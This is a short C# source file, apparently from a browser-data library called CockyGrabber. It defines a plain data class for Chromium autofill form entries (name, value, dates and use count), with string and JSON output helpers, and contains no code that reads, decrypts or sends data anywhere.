using CockyGrabber.Utility;
using System;

namespace CockyGrabber
{
    public static partial class Blink
    {
        public class Form
        {
            public enum Header
            {
                name,
                value,
                value_lower,
                date_created,
                date_last_used,
                count,
            }

            /// <summary>
            /// The name of the form data.
            /// </summary>
            public string Name { get; set; }
            /// <summary>
            /// The value of the form data.
            /// </summary>
            public string Value { get; set; }
            /// <summary>
            /// The value of the form data, converted to lowercase.
            /// </summary>
            public string ValueLower { get; set; }
            /// <summary>
            /// The date the form data was created.
            /// </summary>
            public DateTimeOffset DateCreated { get; set; }
            /// <summary>
            /// The date the form data was last used.
            /// </summary>
            public DateTimeOffset DateLastUsed { get; set; }
            /// <summary>
            /// The number of times the form data was used.
            /// </summary>
            public int Count { get; set; }

            public override string ToString() => $"Name = '{Name}' | Value = '{Value}' | DateLastUsed = '{DateLastUsed}'";
            public string ToJson() => Tools.BrowserInformationToJson(this);
        }
    }
}
